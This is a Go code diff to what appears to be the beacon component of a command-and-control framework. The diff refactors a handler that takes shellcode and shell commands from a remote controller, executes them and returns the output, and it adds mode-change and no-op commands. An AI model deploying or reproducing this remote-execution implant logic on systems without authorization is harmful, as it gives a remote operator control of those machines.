@@ -92,17 +92,21 @@ func (h *handler) logWithInfo(lv logger.Level, log ...interface{}) {
 func (h *handler) OnMessage(answer *protocol.Answer) {
 	defer h.logPanic("handler.OnMessage")
 	if len(answer.Message) < messages.HeaderSize {
-		const log = "controller send with invalid size"
-		h.logWithInfo(logger.Exploit, answer, log)
+		h.logWithInfo(logger.Exploit, answer, "send with invalid size")
 		return
 	}
-	msgType := convert.BytesToUint32(answer.Message[messages.RandomDataSize:messages.HeaderSize])
+	typ := answer.Message[messages.RandomDataSize:messages.HeaderSize]
+	msgType := convert.BytesToUint32(typ)
 	answer.Message = answer.Message[messages.HeaderSize:]
 	switch msgType {
 	case messages.CMDShellCode:
 		h.handleShellCode(answer)
 	case messages.CMDSingleShell:
 		h.handleSingleShell(answer)
+	case messages.CMDBeaconChangeMode:
+		h.handleChangeMode(answer)
+	case messages.CMDBeaconNop:
+		h.handleNopCommand()
 	case messages.CMDTest:
 		h.handleSendTestMessage(answer)
 	case messages.CMDRTTestRequest:
@@ -110,7 +114,7 @@ func (h *handler) OnMessage(answer *protocol.Answer) {
 	case messages.CMDRTTestResponse:
 		h.handleSendTestResponse(answer)
 	default:
-		const format = "controller send unknown message\ntype: 0x%08X\n%s"
+		const format = "send unknown message\ntype: 0x%08X\n%s"
 		h.logf(logger.Exploit, format, msgType, spew.Sdump(answer))
 	}
 }
@@ -118,16 +122,15 @@ func (h *handler) OnMessage(answer *protocol.Answer) {
 func (h *handler) handleShellCode(answer *protocol.Answer) {
 	const title = "handler.handleShellCode"
 	defer h.logPanic(title)
-	es := new(messages.ShellCode)
-	err := msgpack.Unmarshal(answer.Message, es)
+	es := messages.ShellCode{}
+	err := msgpack.Unmarshal(answer.Message, &es)
 	if err != nil {
-		const log = "invalid shellcode data"
-		h.logWithInfo(logger.Exploit, answer, log)
+		h.logWithInfo(logger.Exploit, answer, "invalid shellcode data\nerror:", err)
 		return
 	}
 	errChan := make(chan error, 1)
 	go func() {
-		h.logPanic(title)
+		defer h.logPanic(title)
 		errChan <- shellcode.Execute(es.Method, es.ShellCode)
 	}()
 	timer := time.NewTimer(time.Second)
@@ -136,11 +139,11 @@ func (h *handler) handleShellCode(answer *protocol.Answer) {
 	case err = <-errChan:
 	case <-timer.C:
 	}
-	result := &messages.ShellCodeResult{ID: es.ID}
+	result := messages.ShellCodeResult{ID: es.ID}
 	if err != nil {
 		result.Err = err.Error()
 	}
-	err = h.ctx.sender.Send(h.context, messages.CMDBShellCodeResult, result, true)
+	err = h.ctx.sender.Send(h.context, messages.CMDBShellCodeResult, &result, true)
 	if err != nil {
 		h.log(logger.Error, "failed to send execute shellcode result:", err)
 	}
@@ -149,11 +152,10 @@ func (h *handler) handleShellCode(answer *protocol.Answer) {
 func (h *handler) handleSingleShell(answer *protocol.Answer) {
 	const title = "handler.handleSingleShell"
 	defer h.logPanic(title)
-	ss := new(messages.SingleShell)
-	err := msgpack.Unmarshal(answer.Message, ss)
+	ss := messages.SingleShell{}
+	err := msgpack.Unmarshal(answer.Message, &ss)
 	if err != nil {
-		const log = "invalid single shell data"
-		h.logWithInfo(logger.Exploit, answer, log)
+		h.logWithInfo(logger.Exploit, answer, "invalid single shell data\nerror:", err)
 		return
 	}
 	h.wg.Add(1)
@@ -162,16 +164,61 @@ func (h *handler) handleSingleShell(answer *protocol.Answer) {
 			h.logPanic(title)
 			h.wg.Done()
 		}()
-		sso := &messages.SingleShellOutput{ID: ss.ID}
+		sso := messages.SingleShellOutput{ID: ss.ID}
 		sso.Output, err = shell.Shell(h.context, ss.Command)
 		if err != nil {
 			sso.Err = err.Error()
 		}
-		err = h.ctx.sender.Send(h.context, messages.CMDBSingleShellOutput, sso, true)
+		err = h.ctx.sender.Send(h.context, messages.CMDBSingleShellOutput, &sso, true)
 		if err != nil {
 			h.log(logger.Error, "failed to send single shell output:", err)
 		}
 	}()
+}
+
+func (h *handler) handleChangeMode(answer *protocol.Answer) {
+	defer h.logPanic("handler.handleChangeMode")
+	cm := messages.ChangeMode{}
+	err := msgpack.Unmarshal(answer.Message, &cm)
+	if err != nil {
+		h.logWithInfo(logger.Exploit, answer, "invalid change mode data\nerror:", err)
+		return
+	}
+	if cm.Interactive { // enable
+		err = h.ctx.driver.EnableInteractiveMode()
+	} else { // disable
+		err = h.ctx.driver.DisableInteractiveMode()
+	}
+	// notice mode has been changed
+	if err == nil {
+		mc := messages.ModeChanged{
+			Interactive: cm.Interactive,
+			Reason:      "change mode actively",
+		}
+		err = h.ctx.sender.Send(h.context, messages.CMDBBeaconModeChanged, &mc, false)
+		if err != nil {
+			h.log(logger.Error, "failed to send mode changed:", err)
+		}
+	}
+	// send result
+	if cm.ID.IsZero() {
+		return
+	}
+	cmr := messages.ChangeModeResult{
+		ID: cm.ID,
+	}
+	if err != nil {
+		cmr.Err = err.Error()
+	}
+	err = h.ctx.sender.Send(h.context, messages.CMDBBeaconChangeModeResult, &cmr, false)
+	if err != nil {
+		h.log(logger.Error, "failed to send change mode result:", err)
+	}
+}
+
+// check execute number for prevent attack.
+func (h *handler) handleNopCommand() {
+
 }
 
 // -----------------------------------------send test----------------------------------------------
@@ -187,19 +234,19 @@ func (h *handler) handleSendTestMessage(answer *protocol.Answer) {
 
 func (h *handler) handleSendTestRequest(answer *protocol.Answer) {
 	defer h.logPanic("handler.handleSendTestRequest")
-	request := new(messages.TestRequest)
-	err := msgpack.Unmarshal(answer.Message, request)
+	request := messages.TestRequest{}
+	err := msgpack.Unmarshal(answer.Message, &request)
 	if err != nil {
 		const log = "invalid test request data\nerror:"
 		h.logWithInfo(logger.Exploit, answer, log, err)
 		return
 	}
 	// send response
-	response := &messages.TestResponse{
+	response := messages.TestResponse{
 		ID:       request.ID,
 		Response: request.Request,
 	}
-	err = h.ctx.sender.Send(h.context, messages.CMDBRTTestResponse, response, true)
+	err = h.ctx.sender.Send(h.context, messages.CMDBRTTestResponse, &response, true)
 	if err != nil {
 		const log = "failed to send test response\nerror:"
 		h.logWithInfo(logger.Exploit, answer, log, err)
@@ -208,12 +255,12 @@ func (h *handler) handleSendTestRequest(answer *protocol.Answer) {
 
 func (h *handler) handleSendTestResponse(answer *protocol.Answer) {
 	defer h.logPanic("handler.handleSendTestResponse")
-	response := new(messages.TestResponse)
-	err := msgpack.Unmarshal(answer.Message, response)
+	response := messages.TestResponse{}
+	err := msgpack.Unmarshal(answer.Message, &response)
 	if err != nil {
 		const log = "invalid test response data\nerror:"
 		h.logWithInfo(logger.Exploit, answer, log, err)
 		return
 	}
-	h.ctx.messageMgr.HandleReply(&response.ID, response)
+	h.ctx.messageMgr.HandleReply(&response.ID, &response)
 }
